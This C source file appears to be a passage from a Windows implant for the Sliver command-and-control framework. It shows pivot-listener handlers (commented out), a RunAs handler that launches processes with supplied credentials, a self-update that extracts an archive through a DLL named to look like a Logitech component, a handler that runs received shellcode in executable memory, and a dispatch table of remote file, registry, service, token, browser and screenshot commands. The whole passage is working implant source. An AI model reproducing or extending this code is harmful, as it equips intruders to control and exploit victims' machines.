//		uNumberOfOptions = *((PUINT64)(UnmarshaledData[2]));
//		pOptions = ALLOC(sizeof(BOOL) * uNumberOfOptions);
//		for (i = 0; i < uNumberOfOptions; i++) {
//			pOptions[i] = (BOOL)((PUINT64)(UnmarshaledData[2]))[i + 1];
//		}
//	}
//	
//	pSessionClient = (PSLIVER_SESSION_CLIENT)lpSliverClient;
//	pConfig = pSessionClient->pGlobalConfig;
//	if (uPivotType == PivotType_TCP) {
//		pListener = CreateTCPPivotListener(pConfig, pSessionClient, lpBindAddress);
//	}
//	else if (uPivotType == PivotType_UDP) {
//
//	}
//	else if (uPivotType == PivotType_NamedPipe) {
//		pListener = CreatePipePivotListener(pConfig, pSessionClient, lpBindAddress);
//	}
//
//	if (pListener == NULL) {
//		goto CLEANUP;
//	}
//
//	AcquireSRWLockExclusive(&pConfig->RWLock);
//	if (pConfig->Listeners == NULL) {
//		pConfig->Listeners = ALLOC(sizeof(PPIVOT_LISTENER));
//	}
//	else {
//		pConfig->Listeners = REALLOC(pConfig->Listeners, sizeof(PPIVOT_LISTENER) * (pConfig->dwNumberOfListeners + 1));
//	}
//
//	pConfig->Listeners[pConfig->dwNumberOfListeners++] = pListener;
//	ReleaseSRWLockExclusive(&pConfig->RWLock);
//	RespElements[0] = CreateVarIntElement(pListener->dwListenerId, 1);
//	RespElements[1] = CreateVarIntElement(pListener->dwType, 2);
//	RespElements[2] = CreateBytesElement(pListener->lpBindAddress, lstrlenA(pListener->lpBindAddress), 3);
//	RespElements[3] = NULL;
//
//	pFinalElement = CreateStructElement(RespElements, _countof(RespElements), 0);
//	pResult = ALLOC(sizeof(ENVELOPE));
//	pResult->uID = pEnvelope->uID;
//	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
//	pFinalElement->pMarshaledData = NULL;
//CLEANUP:
//	for (i = 0; i < _countof(PivotStartListenerReq); i++) {
//		FREE(PivotStartListenerReq[i]);
//	}
//
//	if (UnmarshaledData != NULL) {
//		FREE(UnmarshaledData[1]);
//		FREE(UnmarshaledData[2]);
//		FREE(UnmarshaledData);
//	}
//
//	FreeElement(pFinalElement);
//
//	return pResult;
//}

//PENVELOPE PivotPeerEnvelopeHandler
//(
//	_In_ PENVELOPE pEnvelope,
//	_In_ LPVOID lpSliverClient
//)
//{
//	PPIVOT_PEER_ENVELOPE pPeerEnvelope = NULL;
//	PENVELOPE pResult = NULL;
//	DWORD i = 0;
//	DWORD j = 0;
//	PPIVOT_PEER pPivotPeer = NULL;
//	PGLOBAL_CONFIG pConfig = NULL;
//	PSLIVER_SESSION_CLIENT pSession = NULL;
//	PPIVOT_LISTENER pListener = NULL;
//	PPIVOT_CONNECTION pConnection = NULL;
//	UINT64 uNextPeerID = -1;
//	BOOL Found = FALSE;
//	BOOL Send = FALSE;
//	LPSTR lpError = NULL;
//
//	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
//	pConfig = pSession->pGlobalConfig;
//	pPeerEnvelope = UnmarshalPivotPeerEnvelope(pEnvelope->pData);
//	if (pPeerEnvelope == NULL) {
//		goto CLEANUP;
//	}
//
//	for (i = 0; i < pPeerEnvelope->cPivotPeers; i++) {
//		pPivotPeer = pPeerEnvelope->PivotPeers[i];
//		if (pPivotPeer->uPeerID == pConfig->uPeerID) {
//			if (i >= 1) {
//				uNextPeerID = pPeerEnvelope->PivotPeers[i - 1]->uPeerID;
//				break;
//			}
//		}
//	}
//
//	if (uNextPeerID == -1) {
//		lpError = DuplicateStrA("Peer not found", 0);
//		goto CLEANUP;
//	}
//
//	AcquireSRWLockShared(&pConfig->RWLock);
//	for (i = 0; i < pConfig->dwNumberOfListeners; i++)  {
//		pListener = pConfig->Listeners[i];
//		EnterCriticalSection(&pListener->Lock);
//		for (j = 0; j < pListener->dwNumberOfConnections; j++) {
//			pConnection = pListener->Connections[j];
//			if (pConnection->uDownstreamPeerID == uNextPeerID) {
//				Found = TRUE;
//				break;
//			}
//		}
//
//		LeaveCriticalSection(&pListener->Lock);
//		if (Found) {
//			break;
//		}
//	}
//
//	ReleaseSRWLockShared(&pConfig->RWLock);
//	if (!Found) {
//		lpError = DuplicateStrA("Peer not found", 0);
//		goto CLEANUP;
//	}
//
//	if (!WriteEnvelopeToPeer(pConnection, pEnvelope)) {
//		goto CLEANUP;
//	}
//
//	Send = TRUE;
//CLEANUP:
//	if (!Send) {
//		if (lpError == NULL) {
//			lpError = DuplicateStrA("failed to send to peer", 0);
//		}
//
//		pResult = ALLOC(sizeof(ENVELOPE));
//		pResult->uType = MsgPivotPeerFailure;
//		pResult->pData = MarshalPivotPeerFailure(pConfig->uPeerID, PeerFailureType_SEND_FAILURE, lpError);
//	}
//
//	FREE(lpError);
//	FreePivotPeerEnvelope(pPeerEnvelope);
//	return pResult;
//}

//PENVELOPE PivotStopListenerHandler
//(
//	_In_ PENVELOPE pEnvelope,
//	_In_ LPVOID lpSliverClient
//)
//{
//	PPBElement pElement = NULL;
//	PUINT64 pUnmarshaledData = NULL;
//	DWORD dwListenerID = 0;
//	PGLOBAL_CONFIG pConfig = NULL;
//	PSLIVER_SESSION_CLIENT pSession = NULL;
//	DWORD i = 0;
//	DWORD j = 0;
//	PPIVOT_LISTENER pListener = NULL;
//	PENVELOPE pResult = NULL;
//
//	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
//	pConfig = pSession->pGlobalConfig;
//	pElement = ALLOC(sizeof(PBElement));
//	pElement->dwFieldIdx = 1;
//	pElement->Type = Varint;
//	pUnmarshaledData = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
//	if (pUnmarshaledData == NULL) {
//		goto CLEANUP;
//	}
//
//	dwListenerID = *pUnmarshaledData;
//	AcquireSRWLockExclusive(&pConfig->RWLock);
//	for (i = 0; i < pConfig->dwNumberOfListeners; i++) {
//		pListener = pConfig->Listeners[i];
//		if (pListener->dwListenerId == dwListenerID) {
//			FreePivotListener(pListener);
//			WaitForSingleObject(pListener->hThread, INFINITE);
//			for (j = i; j < pConfig->dwNumberOfListeners - 1; j++) {
//				pConfig->Listeners[j] = pConfig->Listeners[j + 1];
//			}
//
//			pConfig->dwNumberOfListeners--;
//			break;
//		}
//	}
//
//	ReleaseSRWLockExclusive(&pConfig->RWLock);
//
//	pResult = ALLOC(sizeof(ENVELOPE));
//	pResult->uID = pEnvelope->uID;
//CLEANUP:
//	FREE(pUnmarshaledData);
//
//	return pResult;
//}

//PENVELOPE PivotListenersHandler
//(
//	_In_ PENVELOPE pEnvelope,
//	_In_ LPVOID lpSliverClient
//)
//{
//	PGLOBAL_CONFIG pConfig = NULL;
//	PSLIVER_SESSION_CLIENT pSession = NULL;
//	DWORD i = 0;
//	DWORD j = 0;
//	PPIVOT_LISTENER pListener = NULL;
//	PPIVOT_CONNECTION pConnection = NULL;
//	PPBElement PivotListener[5];
//	PPBElement NetConnPivot[2];
//	PPBElement Listeners[2];
//	PPBElement* ConnectionList = NULL;
//	PPBElement* ListenerList = NULL;
//	PPBElement pFinalElement = NULL;
//	DWORD dwIdx = 0;
//	PENVELOPE pResult = NULL;
//
//	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
//	pConfig = pSession->pGlobalConfig;
//
//	AcquireSRWLockShared(&pConfig->RWLock);
//	ListenerList = ALLOC(sizeof(PPBElement) * pConfig->dwNumberOfListeners);
//	for (i = 0; i < pConfig->dwNumberOfListeners; i++) {
//		pListener = pConfig->Listeners[i];
//		if (pListener->IsExiting) {
//			continue;
//		}
//
//		EnterCriticalSection(&pListener->Lock);
//		SecureZeroMemory(PivotListener, sizeof(PivotListener));
//		PivotListener[0] = CreateVarIntElement(pListener->dwListenerId, 1);
//		PivotListener[1] = CreateVarIntElement(pListener->dwType, 2);
//		PivotListener[2] = CreateBytesElement(pListener->lpBindAddress, lstrlenA(pListener->lpBindAddress), 3);
//		if (pListener->dwNumberOfConnections > 0) {
//			ConnectionList = ALLOC(pListener->dwNumberOfConnections * sizeof(PPBElement));
//			for (j = 0; j < pListener->dwNumberOfConnections; j++) {
//				pConnection = pListener->Connections[j];
//				SecureZeroMemory(NetConnPivot, sizeof(NetConnPivot));
//				NetConnPivot[0] = CreateVarIntElement(pConnection->uDownstreamPeerID, 1);
//				if (pConnection->lpRemoteAddress != NULL) {
//					NetConnPivot[1] = CreateBytesElement(pConnection->lpRemoteAddress, lstrlenA(pConnection->lpRemoteAddress), 2);
//				}
//
//				ConnectionList[j] = CreateStructElement(NetConnPivot, _countof(NetConnPivot), 0);
//			}
//
//			PivotListener[3] = CreateRepeatedStructElement(ConnectionList, pListener->dwNumberOfConnections, 4);
//		}
//		
//		ListenerList[dwIdx++] = CreateStructElement(PivotListener, _countof(PivotListener), 0);
//		FREE(ConnectionList);
//		LeaveCriticalSection(&pListener->Lock);
//	}
//
//	ReleaseSRWLockShared(&pConfig->RWLock);
//	Listeners[0] = CreateRepeatedStructElement(ListenerList, dwIdx, 1);
//	Listeners[1] = NULL;
//	pFinalElement = CreateStructElement(Listeners, _countof(Listeners), 0);
//	pResult = ALLOC(sizeof(ENVELOPE));
//	pResult->uID = pEnvelope->uID;
//	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
//	pFinalElement->pMarshaledData = NULL;
//CLEANUP:
//	FreeElement(pFinalElement);
//	FREE(ListenerList);
//
//	return pResult;
//}

PENVELOPE RunAsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement RunAsReq[7];
	DWORD i = 0;
	PENVELOPE pResult = NULL;
	LPVOID* UmarshaledData = NULL;
	LPWSTR lpProgram = NULL;
	LPWSTR lpUsername = NULL;
	LPWSTR lpPassword = NULL;
	LPWSTR lpArgs = NULL;
	LPWSTR lpDomain = NULL;
	DWORD dwLogonFlags = 0;
	LPWSTR lpCommandLine = NULL;
	STARTUPINFOW StartupInfo;
	PROCESS_INFORMATION ProcInfo;

	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
	for (i = 0; i < _countof(RunAsReq); i++) {
		RunAsReq[i] = ALLOC(sizeof(PBElement));
		RunAsReq[i]->dwFieldIdx = i + 1;
		RunAsReq[i]->Type = Bytes;
	}
	
	RunAsReq[5]->Type = Varint;
	RunAsReq[6]->Type = Varint;
	UmarshaledData = UnmarshalStruct(RunAsReq, _countof(RunAsReq), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UmarshaledData == NULL || UmarshaledData[0] == NULL || UmarshaledData[1] == NULL || UmarshaledData[4] == NULL) {
		goto CLEANUP;
	}

	lpUsername = ConvertCharToWchar(((PBUFFER)UmarshaledData[0])->pBuffer);
	lpPassword = ConvertCharToWchar(((PBUFFER)UmarshaledData[4])->pBuffer);
	lpProgram = ConvertCharToWchar(((PBUFFER)UmarshaledData[1])->pBuffer);
	if (UmarshaledData[2] != NULL) {
		lpArgs = ConvertCharToWchar(((PBUFFER)UmarshaledData[2])->pBuffer);
		lpCommandLine = StrAppendW(lpProgram, L" ");
		lpCommandLine = StrCatExW(lpCommandLine, lpArgs);
	}

	if (UmarshaledData[3] != NULL) {
		lpDomain = ConvertCharToWchar(((PBUFFER)UmarshaledData[3])->pBuffer);
	}

	if (UmarshaledData[5] != NULL) {
		StartupInfo.dwFlags = SW_HIDE;
	}

	if (UmarshaledData[6] != NULL) {
		dwLogonFlags = LOGON_NETCREDENTIALS_ONLY;
	}

	StartupInfo.cb = sizeof(StartupInfo);
	if (!CreateProcessWithLogonW(lpUsername, lpDomain, lpPassword, dwLogonFlags, lpProgram, lpCommandLine, 0, NULL, NULL, &StartupInfo, &ProcInfo)) {
		LOG_ERROR("CreateProcessWithLogonW", GetLastError());
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	if (UmarshaledData != NULL) {
		for (i = 0; i < 5; i++) {
			FreeBuffer((PBUFFER)UmarshaledData[i]);
		}

		FREE(UmarshaledData);
	}

	for (i = 0; i < _countof(RunAsReq); i++) {
		FREE(RunAsReq[i]);
	}

	FREE(lpProgram);
	FREE(lpArgs);
	FREE(lpCommandLine);
	FREE(lpUsername);
	FREE(lpPassword);
	FREE(lpDomain);

	return pResult;
}


PENVELOPE KillHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	RtlExitUserProcess(0);
}

PENVELOPE UpdateHandler
(
	_In_ PENVELOPE pEnvelope,
	_In_ LPVOID pSliverClient
)
{
	PPBElement ReqElement = NULL;
	PBUFFER* UnmarshaledData = NULL;
	PBUFFER pCompressedData = NULL;
	LPWSTR lpArchivePath = NULL;
	LPWSTR lpTempPath = NULL;
	LPWSTR lpUpdaterPath = NULL;
	LPWSTR lpBit7zPath = NULL;
	STARTUPINFOW StartupInfo;
	PROCESS_INFORMATION ProcInfo;
	PGLOBAL_CONFIG pConfig = NULL;
	PSLIVER_SESSION_CLIENT pSession = NULL;

	pSession = (PSLIVER_SESSION_CLIENT)pSliverClient;
	pConfig = pSession->pGlobalConfig;
	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
	ReqElement = ALLOC(sizeof(PBElement));
	ReqElement->dwFieldIdx = 1;
	ReqElement->Type = Bytes;

	UnmarshaledData = UnmarshalStruct(&ReqElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	pCompressedData = UnmarshaledData[0];
	lpArchivePath = GenerateTempPathW(NULL, L".zip", NULL);
	if (!WriteToFile(lpArchivePath, pCompressedData->pBuffer, pCompressedData->cbBuffer)) {
		goto CLEANUP;
	}
	
	lpTempPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\Installer"));
	lstrcatW(lpTempPath, L"\\Installer");
	if (!CreateDirectoryW(lpTempPath, NULL)) {
		LOG_ERROR("lpTempPath", GetLastError());
		goto CLEANUP;
	}

	lpUpdaterPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\Updater.exe"));
	lstrcatW(lpUpdaterPath, L"\\Updater.exe");

	lpBit7zPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\LogitechLcd.dll"));
	lstrcatW(lpBit7zPath, L"\\LogitechLcd.dll");
	if (Bit7zExtract(lpBit7zPath, lpArchivePath, lpTempPath) == NULL) {
		goto CLEANUP;
	}

	StartupInfo.cb = sizeof(StartupInfo);
	if (!CreateProcessW(lpUpdaterPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcInfo)) {
		LOG_ERROR("CreateProcessW", GetLastError());
		goto CLEANUP;
	}
	else {
		ExitProcess(0);
	}
	
CLEANUP:
	if (ProcInfo.hThread != NULL) {
		CloseHandle(ProcInfo.hThread);
	}

	if (ProcInfo.hProcess != NULL) {
		CloseHandle(ProcInfo.hProcess);
	}

	FREE(lpTempPath);
	FREE(lpUpdaterPath);
	FREE(lpBit7zPath);
	FREE(lpArchivePath);
	FREE(UnmarshaledData);
	FreeBuffer(pCompressedData);
	FreeElement(ReqElement);
	return NULL;
}

PENVELOPE TaskHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement TaskReq[3];
	DWORD i = 0;
	PENVELOPE pResult = NULL;
	LPVOID* UnmarshaledData = NULL;
	BOOL RWXPages = FALSE;
	DWORD dwPid = 0;
	PBUFFER pShellcode = NULL;
	PBYTE pBuffer = NULL;
	DWORD dwOldProtect = 0;
	HANDLE hThread = NULL;
	DWORD dwThreadId = 0;

	for (i = 0; i < _countof(TaskReq); i++) {
		TaskReq[i] = ALLOC(sizeof(PBElement));
		TaskReq[i]->dwFieldIdx = i + 1;
		TaskReq[i]->Type = Varint;
	}

	TaskReq[2]->Type = Bytes;
	UnmarshaledData = UnmarshalStruct(TaskReq, _countof(TaskReq), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[2] == NULL) {
		goto CLEANUP;
	}

	pShellcode = (PBUFFER)UnmarshaledData[2];
	if (UnmarshaledData[0] != NULL) {
		RWXPages = TRUE;
	}

	if (UnmarshaledData[1] != NULL) {
		dwPid = (DWORD)UnmarshaledData[1];
	}

	if (dwPid != 0) {

	}
	else {
		if (RWXPages) {
			pBuffer = VirtualAlloc(NULL, pShellcode->cbBuffer, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		}
		else {
			pBuffer = VirtualAlloc(NULL, pShellcode->cbBuffer, MEM_COMMIT, PAGE_READWRITE);
		}

		if (pBuffer == NULL) {
			LOG_ERROR("VirtualAlloc", GetLastError());
			goto CLEANUP;
		}

		memcpy(pBuffer, pShellcode->pBuffer, pShellcode->cbBuffer);
		if (!RWXPages) {
			if (!VirtualProtect(pBuffer, pShellcode->cbBuffer, PAGE_EXECUTE_READ, &dwOldProtect)) {
				LOG_ERROR("VirtualProtect", GetLastError());
				goto CLEANUP;
			}
		}

		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pBuffer, NULL, 0, &dwThreadId);
		WaitForSingleObject(hThread, 10000);
		CloseHandle(hThread);
	}

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	if (pBuffer != NULL) {
		VirtualFree(pBuffer, 0, MEM_RELEASE);
	}

	for (i = 0; i < _countof(TaskReq); i++) {
		FREE(TaskReq[i]);
	}

	if (UnmarshaledData != NULL) {
		FreeBuffer(UnmarshaledData[2]);
		FREE(UnmarshaledData);
	}

	return pResult;
}

#endif

REQUEST_HANDLER* GetSystemHandler(VOID)
{
	REQUEST_HANDLER* HandlerList = NULL;

	HandlerList = ALLOC(sizeof(LPVOID) * MsgEnd);
	HandlerList[MsgDownloadReq] = (REQUEST_HANDLER)DownloadHandler;
	HandlerList[MsgLsReq] = (REQUEST_HANDLER)LsHandler;
	HandlerList[MsgPing] = (REQUEST_HANDLER)PingHandler;
	HandlerList[MsgUploadReq] = (REQUEST_HANDLER)UploadHandler;
	HandlerList[MsgEnvReq] = (REQUEST_HANDLER)GetEnvHandler;
	HandlerList[MsgCdReq] = (REQUEST_HANDLER)CdHandler;
	HandlerList[MsgPwdReq] = (REQUEST_HANDLER)PwdHandler;
	HandlerList[MsgRmReq] = (REQUEST_HANDLER)RmHandler;
	HandlerList[MsgMkdirReq] = (REQUEST_HANDLER)MkdirHandler;
	HandlerList[MsgExecuteReq] = (REQUEST_HANDLER)ExecuteHandler;
	HandlerList[MsgMvReq] = (REQUEST_HANDLER)MvHandler;
	HandlerList[MsgCpReq] = CpHandler;
	HandlerList[MsgServicesReq] = (REQUEST_HANDLER)ServicesHandler;
	HandlerList[MsgGetPrivsReq] = (REQUEST_HANDLER)GetPrivsHandler;
	HandlerList[MsgCurrentTokenOwnerReq] = (REQUEST_HANDLER)CurrentTokenOwnerHandler;
	HandlerList[MsgIfconfigReq] = (REQUEST_HANDLER)IfconfigHandler;
	HandlerList[MsgNetstatReq] = (REQUEST_HANDLER)NetstatHandler;
	HandlerList[MsgPsReq] = (REQUEST_HANDLER)PsHandler;
	HandlerList[MsgTerminateReq] = (REQUEST_HANDLER)TerminateHandler;
	HandlerList[MsgRegistryReadReq] = (REQUEST_HANDLER)RegistryReadHandler;
	HandlerList[MsgRegistryWriteReq] = (REQUEST_HANDLER)RegistryWriteHandler;
	HandlerList[MsgRegistryCreateKeyReq] = (REQUEST_HANDLER)RegistryCreateKeyHandler;
	HandlerList[MsgRegistryDeleteKeyReq] = (REQUEST_HANDLER)RegistryDeleteKeyHandler;
	HandlerList[MsgRegistrySubKeysListReq] = (REQUEST_HANDLER)RegistrySubKeysListHandler;
	HandlerList[MsgRegistryListValuesReq] = (REQUEST_HANDLER)RegistryListValuesHandler;
	HandlerList[MsgServiceDetailReq] = (REQUEST_HANDLER)ServiceDetailHandler;
	HandlerList[MsgBrowserReq] = (REQUEST_HANDLER)BrowserHandler;

#ifdef _FULL
	HandlerList[MsgIcaclsReq] = (REQUEST_HANDLER)IcaclsHandler;
	/*HandlerList[MsgStartServiceByNameReq] = StartServiceByNameHandler;*/
	HandlerList[MsgChownReq] = (REQUEST_HANDLER)ChownHandler;
	HandlerList[MsgCmdReq] = (REQUEST_HANDLER)CmdHandler;
	HandlerList[MsgKillSessionReq] = (REQUEST_HANDLER)KillHandler;
	HandlerList[MsgTaskReq] = (REQUEST_HANDLER)TaskHandler;
	HandlerList[MsgProcessDumpReq] = NULL;
	HandlerList[MsgImpersonateReq] = (REQUEST_HANDLER)ImpersonateHandler;
	HandlerList[MsgRevToSelfReq] = (REQUEST_HANDLER)RevToSelfHandler;
	HandlerList[MsgRunAsReq] = (REQUEST_HANDLER)RunAsHandler;
	HandlerList[MsgInvokeGetSystemReq] = NULL;
	HandlerList[MsgInvokeExecuteAssemblyReq] = NULL;
	HandlerList[MsgInvokeInProcExecuteAssemblyReq] = NULL;
	HandlerList[MsgInvokeMigrateReq] = NULL;
	HandlerList[MsgSpawnDllReq] = NULL;
	HandlerList[MsgCreateServiceReq] = (REQUEST_HANDLER)CreateServiceHandler;
	HandlerList[MsgStartServiceReq] = (REQUEST_HANDLER)StartServiceHandler;
	HandlerList[MsgStopServiceReq] = (REQUEST_HANDLER)StopServiceHandler;
	HandlerList[MsgRemoveServiceReq] = (REQUEST_HANDLER)RemoveServiceHandler;
	HandlerList[MsgSetEnvReq] = NULL;
	HandlerList[MsgUnsetEnvReq] = NULL;
	HandlerList[MsgScreenshotReq] = (REQUEST_HANDLER)ScreenshotHandler;
	HandlerList[MsgSideloadReq] = NULL;
	HandlerList[MsgMakeTokenReq] = (REQUEST_HANDLER)MakeTokenHandler;
	HandlerList[MsgReconfigureReq] = NULL;
	HandlerList[MsgSSHCommandReq] = NULL;
	HandlerList[MSgAttribReq] = (REQUEST_HANDLER)AttribHandler;
	HandlerList[MsgChtimesReq] = (REQUEST_HANDLER)ChtimesHandler;
	HandlerList[MsgRegisterExtensionReq] = NULL;
	HandlerList[MsgCallExtensionReq] = NULL;
	HandlerList[MsgListExtensionsReq] = NULL;
	HandlerList[MsgUpdate] = (REQUEST_HANDLER)UpdateHandler;
#endif
	// Pivots
	/*HandlerList[MsgPivotStartListenerReq] = PivotStartListenerHandler;
	HandlerList[MsgPivotStopListenerReq] = PivotStopListenerHandler;
	HandlerList[MsgPivotListenersReq] = PivotListenersHandler;
	HandlerList[MsgPivotPeerEnvelope] = PivotPeerEnvelopeHandler;*/

	return HandlerList;
}